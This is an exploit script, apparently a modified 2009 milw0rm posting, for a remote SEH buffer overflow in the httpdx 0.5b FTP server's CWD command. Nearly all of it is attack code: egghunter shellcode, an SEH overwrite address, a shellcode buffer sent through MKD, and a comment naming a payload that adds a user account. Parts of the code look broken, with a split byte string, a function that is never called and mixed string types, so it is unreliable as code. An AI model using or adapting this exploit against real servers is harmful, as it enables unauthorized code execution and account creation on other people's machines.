#!/usr/bin/python
#[*] Usage : httpdx_cwd.py [target_ip] user pass 
#[*] Example : httpdx_cwd.py 192.168.1.3 ftp 123
# Stack encouraged me to exploit this bug , so thx brotha
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : httpdx <= 0.5b FTP Server (CWD) Remote BOF Exploit (SEH)
#[*] Refer :  sico2819
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),Algerians Elites,snakespc.com
#[*] Serra7 Merra7 koulchi mderra7 :p

#[x] Note : I used the case when idm is installed because its dll (idmmbc.dll) is loaded with httpdx.


from payload import buf
import socket

import sys
def shell_attack(target_machine, target_port):



# skape's egghunter shellcode
        shellunt=b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
        "\xef\xb8\x44\x7A\x32\x37\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

        # win32_adduser -  PASS=27 EXITFUNC=seh USER=dz Size=228 Encoder=PexFnstenvSub http://metasploit.com
       

        payload = b'\x41'*26
        payload += shellunt
        payload += b'\xEB\xDE\x90\x90'
        payload += b'\x87\x23\x02\x10'
        payload += b'\x44'*900

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_machine,target_port))
       

        s.recv(1024)
        s.send('USER '+'USER'+'\r\n')
        s.recv(1024)
        s.send('PASS '+'PASS'+'\r\n')
        s.recv(1024)
        s.send('MKD '+buf+'\r\n') # i placed the shellcode in the MKD command ;)
        s.recv(1024)
        s.send('CWD '+payload+'\r\n')
        print ("Egghunter is hunting...;)")
       
        s.close()

        # milw0rm.com [2009-05-19]